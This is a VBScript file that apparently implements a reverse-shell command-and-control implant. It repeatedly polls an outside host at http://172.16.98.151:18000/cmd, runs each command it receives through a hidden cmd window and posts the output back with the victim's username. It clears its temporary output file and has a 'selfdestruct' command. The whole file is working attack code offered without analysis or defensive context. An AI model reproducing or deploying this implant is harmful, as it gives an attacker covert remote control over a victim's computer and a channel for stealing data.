Option Explicit
On Error Resume Next

' Instantiate objects
Dim shell: Set shell = CreateObject("WScript.Shell")
Dim fs: Set fs = CreateObject("Scripting.FileSystemObject")
Dim oHTTP: set oHTTP = CreateObject("Microsoft.XMLHTTP")


Dim serverHost
serverHost = "http://172.16.98.151:18000/"
Dim userName
userName = CreateObject("WScript.Network").UserName
Dim pollingPeriod
pollingPeriod = 2000

' A new cmd is open at each command so need to keep track of directory if changed
Dim currentPath

Function HTTPPost(sUrl, sRequest)
  oHTTP.open "POST", sUrl,false
  oHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
  oHTTP.setRequestHeader "Content-Length", Len(sRequest)
  oHTTP.send sRequest
  HTTPPost = oHTTP.responseText
End Function

Function ExecuteCommand(command)
  ' Taken from revbshell

  'Execute and write to file
  Dim strOutFile: strOutFile = fs.GetSpecialFolder(2) & "\rso.txt"
  shell.Run "cmd /C " & command &" > """ & strOutFile & """ 2>&1", 0, True

  ' Read out file
  Dim file: Set file = fs.OpenTextFile(strOutfile, 1)
  Dim consoleOutput
  If Not file.AtEndOfStream Then
      consoleOutput = file.ReadAll
  Else
      consoleOutput = "[empty result]"
  End If
  file.Close
  fs.DeleteFile strOutFile, True

  ' Clean up
  strOutFile = Empty

  ' Return
  ExecuteCommand = consoleOutput

End Function


While True

  ' Make an HTTP POST request to get the command to execute
  Dim url
  url = serverHost & "cmd"

  Dim body
  body = "username=" & userName

  Dim command
  command = HTTPPost(url,body)

  Select Case LCase(command)
    Case "selfdestruct"
      Dim selfDestructConfirmation
      selfDestructConfirmation = HTTPPost(serverHost & "response","output=SELF DESTRUCTED" & "&username=" & userName)
      'Wscript.Echo "Seppuku!"
      WScript.Quit 0

    Case "standby"
      'nothing

    Case else
      ' Exectue the command
      Dim consoleOutput
      consoleOutput = ExecuteCommand(command)

      'Make an HTTP POST request to send back the console output
      Dim confirmation
      confirmation = HTTPPost(serverHost & "response","output=" & consoleOutput & "&username=" & userName)

      'Wscript.Echo confirmation
  End Select




  ' Sleep for a while
  WScript.Sleep pollingPeriod
Wend
